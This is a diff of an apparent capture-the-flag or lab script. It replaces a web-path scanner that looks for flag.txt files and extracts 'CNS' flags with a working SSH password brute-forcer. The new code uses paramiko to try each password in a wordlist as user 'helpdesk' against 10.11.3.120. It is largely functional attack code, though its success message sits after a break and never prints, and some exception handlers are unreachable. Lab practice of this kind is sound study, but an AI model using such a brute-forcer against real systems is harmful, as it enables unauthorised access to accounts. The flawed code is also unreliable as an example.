@@ -1,28 +1,43 @@
-import requests
-import urllib3
-import urllib.parse
-from bs4 import BeautifulSoup
-from selenium import webdriver
-import re
+import paramiko
+import time
 
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #This is to remove a ssl error.
-#had help from this stack overflow post https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pytho
-file = open("directories.txt", "r") 
-contents = file.read().split("\n") 
-for item in contents: 
-    url = 'http://10.11.3.120/'+item+'/flag.txt'
-    r = requests.get(url, verify=False) 
-    if r.status_code == 200: 
-        result = url
-        print(result)
-        
-target = result
-web = webdriver.Chrome() 
-web.get(target) 
-sauce = BeautifulSoup(web.page_source,"html.parser") 
-regexFlag = 'CNS\W\w{2,}\W'
-flags = re.findall(regexFlag, str(sauce), re.IGNORECASE) 
+def sshlogin(password):
+    #urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    host = '10.11.3.120'
+    port = 22
+    username = 'helpdesk'
+    
 
-print(flags)        
-        
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(host, port, username, password)
+    #stdin, stdout, stderr = ssh.exec_command('ls')
+    #print (stdout.readlines())
+
+
+file = open("passwords.txt", "r") 
+passwords = file.read().split("\n")
+nopes = []
+client = paramiko.SSHClient()
+while True:
+    for item in passwords:
+        if item not in nopes:
+            try:
+                login = sshlogin(item)
+            except paramiko.AuthenticationException:
+                print(item+ ' = nope')
+                nopes.append(item)
+                client.close()
+                time.sleep(20)
+            except Exception as e:
+                pass
+            except EOFError as e:
+                pass
+            except paramiko.ssh_exception.SSHException as e:
+                pass
+            except ConnectionError as e:
+                pass
+            else:
+                break
+                print('Got it: '+item)
